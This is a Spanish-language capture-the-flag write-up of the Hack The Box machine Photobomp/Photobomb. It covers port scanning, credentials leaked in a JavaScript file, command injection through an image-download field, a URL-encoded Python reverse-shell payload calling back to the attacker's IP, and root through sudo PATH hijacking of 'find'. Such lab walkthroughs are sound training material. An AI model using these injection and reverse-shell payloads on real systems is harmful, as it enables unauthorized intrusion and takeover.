---
layout: single
title: Photobomp - Hack The Box
date: 2023-02-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-photobomp/photobompcard.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - linux
---

Write Up de la máquina Photobomp, máquina Linux!

## Linux / 10.10.11.182

![](/assets/images/htb-writeup-photobomb/photobomp.png)

### Técnicas
------------------
- Virtual Hosting
- Web enumeration 
- Information Leakage - Credentials in Javascript File
- Abusing Image Download Utility (Command Injection) [RCE]
- Abusing Sudoers privilege + PATH Hijacking (find command)

### Detailed steps
------------------

### Nmap

De primeras lanzaremos un nmap a la máquina para ver que puertos están abiertos.


```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-16 16:18 CET
Initiating SYN Stealth Scan at 16:18
Scanning 10.10.11.182 [65535 ports]
Discovered open port 80/tcp on 10.10.11.182
Discovered open port 22/tcp on 10.10.11.182
Completed SYN Stealth Scan at 16:19, 10.46s elapsed (65535 total ports)
Nmap scan report for 10.10.11.182
Host is up, received user-set (0.035s latency).
Scanned at 2023-02-16 16:18:56 CET for 10s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.59 seconds
           Raw packets sent: 65865 (2.898MB) | Rcvd: 65640 (2.626MB)

```
Sabiendo ya los puertos que están abiertos, haremos un escaneo más exhaustivo para detectar el sevicio y la versión que corre através de esos puertos.

```
nmap -sCV -p22,80 10.10.11.182 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-16 16:27 CET
Nmap scan report for 10.10.11.182
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.03 seconds

```
Antes de comenzar con la fase de intrusión añadiremos al `/etc/hosts` la siguiente linea

```
cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  p4rr0t
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
10.10.11.182 photobomb.htb

```
### Intrusión

Nos dirigimos a la web para visualizar la web.

![paginaWeb](/assets/images/htb-writeup-photobomb/webServer.png)

Vamos a ojear el codigo fuente, a ver si están leakeando algún dato que nos pueda ser útil. Pulsaremos `ctrl+u`

![photobompjs](/assets/images/htb-writeup-photobomb/photobompjs.png)

Podemos comprobar que hay un `.js` vamos a ver que hay dentro de este fichero...

![photobombleakedjs](/assets/images/htb-writeup-photobomb/photobompleakedjs.png)

Podemos observar que están leakeadas tanto el usuario `pH0t0` como la password `b0Mb!`, credenciales las cuales podemos probar sobre el panel de autenticación de la web.

![downloadPhoto](/assets/images/htb-writeup-photobomb/downloadPhoto.png)

Credenciales válidas, visualizamos ahora una web donde nos permite descargar imágenes. Antes de nada, vamos a abrir `burpsuite` para comprobar que petición se hace por detrás.

### Injeccion de comandos

![Burpsuite](/assets/images/htb-writeup-photobomb/Burpsuite.png)

Vamos intentar injectar comandos en servidor en el campo `filetype`

`photo=almas-salakhov-VK7TCqcZTlw-unsplash.jpg&filetype=jpg;curl+10.10.14.8/example&dimensions=3000x2000`

Vamos a crear un servidor http con `python` que escuche en el puerto `80`

![httpPython](/assets/images/htb-writeup-photobomb/httpPython.png)

Vemos que se ha realizado la petición correctamente, por lo que es vulnerable a injección de comandos, vamos a tratar de crearnos una `rev shell`

### Ejecucion remota de comandos.
Vamos a injectar un payload, con una `rev shell` como esté que pondré abajo, ya que, he probado varios con `bash` y no funciona, por lo que lo haré con `Python`

`export%20RHOST%3D%2210.10.XX.XX%22%3Bexport%20RPORT%3D443%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27`

Lo mandaremos URL encodeado

Nos ponemos en escucha por el puerto `443`

![ncListen](/assets/images/htb-writeup-photobomb/paDentro.png)

Ya estamos dentro de la máquina! Vamos a realizar un tratamiento de la tty

![tratamientoTty](/assets/images/htb-writeup-photobomb/tratamientoTty.png)

Realizaremos lo siguiente, `python3 -c 'import pty;pty.spawn("/bin/bash")'`. Pulsaremos `ctrl+z`
Acto seguido con el comando `stty raw -echo; fg` resetearemos la terminal con un `reset xterm`

![IntrusionOK](/assets/images/htb-writeup-photobomb/IntrusionOK.png)

Ya podemos visualizar la primera flag!

![primeraFlag](/assets/images/htb-writeup-photobomb/primeraFlag.png)

### Escalada de privilegios

Vamos con la escalada de privilegios, que en este caso es bastante sencilla.

Observamos con un `sudo -l` los privilegios que tenemos sobre la máquina con el usuario `wizard`

```
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~/photobomb$ 


```
Podemos ejecutar como root el fichero `/opt/cleanup.sh`

Vamos ha mirar el contenido del script...

```
wizard@photobomb:/opt$ cat cleanup.sh 
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
wizard@photobomb:/opt$

```
Podemos hacer un PATH Hijacking del binario `find`, el script toma el fichero `photobomb.log` y lo mueve a `photobomb.log.old` y luego usa el truncate para borrar el contenido de `photobomb.log`.
Al no usar rutas absolutas podemos aprovecharnos del binario `find`

Vamos a crear un fichero con nombre `find` con dentro un `/bin/bash` en la ruta `/dev/shm` por ejemplo...

```

wizard@photobomb:/dev/shm$ cat find 
#!/bin/bash

/bin/bash
wizard@photobomb:/dev/shm$
wizard@photobomb:/dev/shm$ ll
total 4
drwxrwxrwt  3 root   root     80 Feb 16 17:19 ./
drwxr-xr-x 18 root   root   3960 Feb 16 10:55 ../
-rwxr-xr-x  1 wizard wizard   23 Feb 16 17:19 find*
drwx------  4 root   root     80 Feb 16 10:55 multipath/
wizard@photobomb:/dev/shm$ chmod +x find
wizard@photobomb:/dev/shm$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:/home/wizard/photobomb#

```
Ya finalmente podremos visualizar la segunda flag de `root`. GG WP!

![rootFlag](/assets/images/htb-writeup-photobomb/rootFlag.png)


Espero a verlo explicado lo mejor posible, cualquier error o sugerencia hacermelo saber! Muchas gracias por leer el write up!

Nos vemos en el siguiente Write Up
